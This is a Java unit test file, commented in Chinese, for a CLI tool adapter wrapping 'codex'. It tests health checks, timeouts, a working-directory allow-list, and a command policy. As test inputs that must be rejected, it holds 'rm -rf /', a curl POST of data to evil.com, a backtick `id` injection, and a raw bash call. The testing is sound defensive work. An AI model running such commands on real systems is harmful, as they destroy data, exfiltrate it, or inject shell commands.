package io.github.legacygraph.understanding.tool.adapter;

import io.github.legacygraph.understanding.tool.*;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.io.IOException;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

/**
 * CliToolAdapter 单元测试。
 *
 * <p>测试覆盖：
 * <ul>
 *   <li>命令不存在 → {@link ToolStatus#NOT_INSTALLED}</li>
 *   <li>工作目录越界 → {@code DENIED}</li>
 *   <li>执行超时 → {@code TIMEOUT}</li>
 *   <li>成功执行 → {@code SUCCESS} + stdoutSha256</li>
 *   <li>拒绝原始 shell → {@link CliCommandPolicy} 抛出 {@link SecurityException}</li>
 * </ul>
 *
 * <p>所有测试使用 Mock 的 {@link CliProcessRunner} 避免实际执行命令。
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("CliToolAdapter 单元测试")
class CliToolAdapterTest {

    /** Mock 进程运行器，避免真实执行命令 */
    @Mock
    private CliProcessRunner processRunner;

    /** 使用真实的 CliCommandPolicy（空白名单 = 宽松模式） */
    private CliCommandPolicy commandPolicy;

    /** 被测试的 CLI 工具适配器 */
    private CliToolAdapter adapter;

    /** 测试用工作目录 */
    private static final String TEST_WORK_DIR = "/tmp/legacygraph-test";

    @BeforeEach
    void setUp() {
        // 空白名单 = 宽松模式（测试友好）
        commandPolicy = new CliCommandPolicy(Collections.emptySet());
        // 手动构造 adapter（注入 mock 的 processRunner）
        adapter = new CliToolAdapter(
                "codex",                                    // toolName
                "codex exec --no-write --json \"{query}\"", // commandTemplate
                180,                                        // timeoutSeconds
                200_000,                                    // maxOutputBytes
                processRunner,
                commandPolicy
        );
    }

    // ==================== checkHealth 测试 ====================

    /**
     * 测试：命令不存在时返回 NOT_INSTALLED。
     */
    @Test
    @DisplayName("命令不存在 → NOT_INSTALLED")
    void checkHealth_whenCommandNotFound_returnsNotInstalled() throws Exception {
        // 模拟 command -v 返回非零（命令不存在）
        final CliProcessRunner.ProcessResult notFoundResult =
                new CliProcessRunner.ProcessResult(1, "", "command not found", "", 5, false);
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenReturn(notFoundResult);

        final ToolContext context = ToolContext.builder()
                .projectRoot(TEST_WORK_DIR)
                .build();

        final ToolHealth health = adapter.checkHealth(context);

        assertNotNull(health);
        assertEquals("codex", health.getToolName());
        assertEquals(ToolKind.CLI, health.getToolKind());
        assertEquals(ToolStatus.NOT_INSTALLED, health.getStatus());
        assertTrue(health.getCapabilities().isEmpty());
        assertTrue(health.getMessage().contains("command -v 未找到"));
    }

    /**
     * 测试：命令存在时返回 READY。
     */
    @Test
    @DisplayName("命令存在 → READY")
    void checkHealth_whenCommandExists_returnsReady() throws Exception {
        final CliProcessRunner.ProcessResult foundResult =
                new CliProcessRunner.ProcessResult(0, "/usr/local/bin/codex\n", "", sha256("/usr/local/bin/codex\n"), 10, false);
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenReturn(foundResult);

        final ToolContext context = ToolContext.builder()
                .projectRoot(TEST_WORK_DIR)
                .build();

        final ToolHealth health = adapter.checkHealth(context);

        assertNotNull(health);
        assertEquals(ToolStatus.READY, health.getStatus());
        assertEquals(3, health.getCapabilities().size());
        assertTrue(health.getCapabilities().contains(ToolCapability.READ_SNIPPET));
        assertTrue(health.getCapabilities().contains(ToolCapability.SUMMARIZE));
        assertTrue(health.getCapabilities().contains(ToolCapability.RUN_AGENT_RESEARCH));
        assertTrue(health.getMessage().contains("/usr/local/bin/codex"));
    }

    /**
     * 测试：健康检查异常时返回 UNAVAILABLE。
     */
    @Test
    @DisplayName("健康检查异常 → UNAVAILABLE")
    void checkHealth_whenException_returnsUnavailable() throws Exception {
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenThrow(new IOException("进程启动失败"));

        final ToolContext context = ToolContext.builder()
                .projectRoot(TEST_WORK_DIR)
                .build();

        final ToolHealth health = adapter.checkHealth(context);

        assertNotNull(health);
        assertEquals(ToolStatus.UNAVAILABLE, health.getStatus());
        assertTrue(health.getMessage().contains("进程启动失败"));
    }

    // ==================== execute 测试 ====================

    /**
     * 测试：成功执行 → SUCCESS + stdoutSha256。
     */
    @Test
    @DisplayName("成功执行 → SUCCESS + stdoutSha256")
    void execute_success_returnsSuccessWithSha256() throws Exception {
        final String stdout = "{\"result\": \"代码分析完成\"}";
        final String stdoutSha256 = CliProcessRunner.sha256(stdout.getBytes());

        final CliProcessRunner.ProcessResult successResult =
                new CliProcessRunner.ProcessResult(0, stdout, "", stdoutSha256, 1500, false);
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenReturn(successResult);

        final ToolRequest request = ToolRequest.builder()
                .projectId("project-1")
                .versionId("v1")
                .operation(ToolCapability.READ_SNIPPET)
                .parameters(Map.of("query", "分析 UserService.java"))
                .workingDir(TEST_WORK_DIR)
                .build();

        final ToolResult result = adapter.execute(request);

        assertNotNull(result);
        assertEquals("codex", result.getToolName());
        assertEquals(ToolKind.CLI, result.getToolKind());
        assertEquals(ToolCapability.READ_SNIPPET, result.getOperation());
        assertEquals("SUCCESS", result.getStatus());
        assertEquals(0, result.getExitCode());
        assertEquals(1500L, result.getElapsedMs());
        assertEquals(stdoutSha256, result.getStdoutSha256());
        assertNotNull(result.getStdoutExcerpt());
        assertTrue(result.getStdoutExcerpt().contains("代码分析完成"));
    }

    /**
     * 测试：执行超时 → TIMEOUT。
     */
    @Test
    @DisplayName("超时 → TIMEOUT")
    void execute_timeout_returnsTimeout() throws Exception {
        final CliProcessRunner.ProcessResult timeoutResult =
                new CliProcessRunner.ProcessResult(-1, "", "killed", "", 180_000, true);
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenReturn(timeoutResult);

        final ToolRequest request = ToolRequest.builder()
                .projectId("project-1")
                .operation(ToolCapability.RUN_AGENT_RESEARCH)
                .parameters(Map.of("query", "分析整个项目"))
                .workingDir(TEST_WORK_DIR)
                .build();

        final ToolResult result = adapter.execute(request);

        assertNotNull(result);
        assertEquals("TIMEOUT", result.getStatus());
        assertEquals(CliProcessRunner.ProcessResult.TIMEOUT_EXIT_CODE, result.getExitCode());
        assertEquals(180_000L, result.getElapsedMs());
    }

    /**
     * 测试：执行失败 → FAILED。
     */
    @Test
    @DisplayName("执行失败（非零退出码） → FAILED")
    void execute_nonZeroExit_returnsFailed() throws Exception {
        final CliProcessRunner.ProcessResult failResult =
                new CliProcessRunner.ProcessResult(1, "", "Error: 无法解析", "", 500, false);
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenReturn(failResult);

        final ToolRequest request = ToolRequest.builder()
                .projectId("project-1")
                .operation(ToolCapability.SUMMARIZE)
                .parameters(Map.of("query", "总结"))
                .workingDir(TEST_WORK_DIR)
                .build();

        final ToolResult result = adapter.execute(request);

        assertEquals("FAILED", result.getStatus());
        assertEquals(1, result.getExitCode());
        assertNotNull(result.getErrorExcerpt());
    }

    /**
     * 测试：进程运行器抛出异常 → FAILED。
     */
    @Test
    @DisplayName("进程运行异常 → FAILED")
    void execute_whenRunnerThrows_returnsFailed() throws Exception {
        when(processRunner.run(anyString(), anyList(), anyInt(), anyLong()))
                .thenThrow(new IOException("无法启动进程"));

        final ToolRequest request = ToolRequest.builder()
                .projectId("project-1")
                .operation(ToolCapability.READ_SNIPPET)
                .parameters(Map.of("query", "test"))
                .workingDir(TEST_WORK_DIR)
                .build();

        final ToolResult result = adapter.execute(request);

        assertEquals("FAILED", result.getStatus());
        assertEquals(-1, result.getExitCode());
        assertTrue(result.getErrorExcerpt().contains("无法启动进程"));
    }

    // ==================== CliCommandPolicy 测试 ====================

    /**
     * 测试：拒绝原始 shell —— 未注册的工具名应被拒绝。
     */
    @Test
    @DisplayName("拒绝原始 shell：未注册工具名 → SecurityException")
    void validateCommand_rejectsUnregisteredTool() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        final SecurityException ex = assertThrows(SecurityException.class, () ->
                policy.validateCommand("bash", "/tmp", List.of("bash", "-c", "echo hello"))
        );

        assertTrue(ex.getMessage().contains("未注册的 CLI 工具"));
        assertTrue(ex.getMessage().contains("bash"));
    }

    /**
     * 测试：拒绝禁止的命令模式 —— rm -rf。
     */
    @Test
    @DisplayName("拒绝禁止模式：rm -rf → SecurityException")
    void validateCommand_rejectsRmRf() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        final SecurityException ex = assertThrows(SecurityException.class, () ->
                policy.validateCommand("codex", "/tmp", List.of("codex", "exec", "rm -rf /"))
        );

        assertTrue(ex.getMessage().contains("禁止模式"));
    }

    /**
     * 测试：拒绝禁止的命令模式 —— git push。
     */
    @Test
    @DisplayName("拒绝禁止模式：git push → SecurityException")
    void validateCommand_rejectsGitPush() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        final SecurityException ex = assertThrows(SecurityException.class, () ->
                policy.validateCommand("git", "/tmp", List.of("git", "push", "origin", "main"))
        );

        assertTrue(ex.getMessage().contains("禁止模式"));
    }

    /**
     * 测试：拒绝禁止的命令模式 —— curl 上传。
     */
    @Test
    @DisplayName("拒绝禁止模式：curl POST → SecurityException")
    void validateCommand_rejectsCurlPost() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        final SecurityException ex = assertThrows(SecurityException.class, () ->
                policy.validateCommand("codex", "/tmp", List.of("codex", "exec", "curl -d 'data' http://evil.com"))
        );

        assertTrue(ex.getMessage().contains("禁止模式"));
    }

    /**
     * 测试：拒绝禁止的命令模式 —— 反引号命令替换。
     */
    @Test
    @DisplayName("拒绝禁止模式：反引号命令替换 → SecurityException")
    void validateCommand_rejectsBacktickInjection() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        final SecurityException ex = assertThrows(SecurityException.class, () ->
                policy.validateCommand("codex", "/tmp", List.of("codex", "exec", "`id`"))
        );

        assertTrue(ex.getMessage().contains("禁止模式"));
    }

    /**
     * 测试：拒绝空命令列表。
     */
    @Test
    @DisplayName("拒绝空命令列表 → SecurityException")
    void validateCommand_rejectsEmptyCommand() {
        final CliCommandPolicy policy = new CliCommandPolicy(Collections.emptySet());

        assertThrows(SecurityException.class, () ->
                policy.validateCommand("codex", "/tmp", List.of())
        );
    }

    /**
     * 测试：ClIToolAdapter execute 被安全策略拒绝 → DENIED。
     *
     * <p>这是集成验证：当 CliCommandPolicy 抛出 SecurityException 时，
     * CliToolAdapter 应返回 DENIED 状态的 ToolResult，而不是抛出异常。
     */
    @Test
    @DisplayName("安全策略拒绝 → ToolResult DENIED")
    void execute_whenPolicyDenies_returnsDenied() throws Exception {
        // 使用严格白名单的 policy，工作目录不在白名单内
        final CliCommandPolicy strictPolicy = new CliCommandPolicy(
                Set.of("/allowed/projects"));
        final CliToolAdapter strictAdapter = new CliToolAdapter(
                "codex", "codex exec --no-write --json \"{query}\"",
                180, 200_000, processRunner, strictPolicy);

        final ToolRequest request = ToolRequest.builder()
                .projectId("project-1")
                .operation(ToolCapability.READ_SNIPPET)
                .parameters(Map.of("query", "test"))
                .workingDir("/tmp/unauthorized")  // 不在白名单内
                .build();

        final ToolResult result = strictAdapter.execute(request);

        assertNotNull(result);
        assertEquals("DENIED", result.getStatus());
        assertEquals(-1, result.getExitCode());
        assertTrue(result.getErrorExcerpt().contains("工作目录不在白名单内"));
        // 确保 processRunner 没有被调用
        verify(processRunner, never()).run(anyString(), anyList(), anyInt(), anyLong());
    }

    /**
     * 测试：toolName() 和 toolKind() 正确返回。
     */
    @Test
    @DisplayName("toolName() 和 toolKind() 返回正确值")
    void toolNameAndKind_returnsCorrectValues() {
        assertEquals("codex", adapter.toolName());
        assertEquals(ToolKind.CLI, adapter.toolKind());
    }

    /**
     * 测试：capabilities() 返回正确的三个能力。
     */
    @Test
    @DisplayName("capabilities() 返回 {READ_SNIPPET, SUMMARIZE, RUN_AGENT_RESEARCH}")
    void capabilities_returnsCorrectSet() {
        final Set<ToolCapability> caps = adapter.capabilities();

        assertEquals(3, caps.size());
        assertTrue(caps.contains(ToolCapability.READ_SNIPPET));
        assertTrue(caps.contains(ToolCapability.SUMMARIZE));
        assertTrue(caps.contains(ToolCapability.RUN_AGENT_RESEARCH));
    }

    // ==================== 命令行解析测试 ====================

    /**
     * 测试：parseCommandLine 正确解析带引号的命令行。
     */
    @Test
    @DisplayName("parseCommandLine 解析带引号命令行")
    void parseCommandLine_parsesQuotedArgs() {
        final List<String> tokens = CliToolAdapter.parseCommandLine(
                "codex exec --no-write --json \"hello world\"");

        assertEquals(5, tokens.size());
        assertEquals("codex", tokens.get(0));
        assertEquals("exec", tokens.get(1));
        assertEquals("--no-write", tokens.get(2));
        assertEquals("--json", tokens.get(3));
        assertEquals("hello world", tokens.get(4));
    }

    /**
     * 测试：parseCommandLine 处理 {query} 占位符替换后的命令行。
     */
    @Test
    @DisplayName("parseCommandLine 处理替换后的空 query")
    void parseCommandLine_withEmptyQuery() {
        final List<String> tokens = CliToolAdapter.parseCommandLine(
                "codex exec --no-write --json \"\"");

        assertEquals(5, tokens.size());
        assertEquals("", tokens.get(4));
    }

    // ==================== 辅助方法 ====================

    private String sha256(final String input) {
        return CliProcessRunner.sha256(input.getBytes());
    }
}
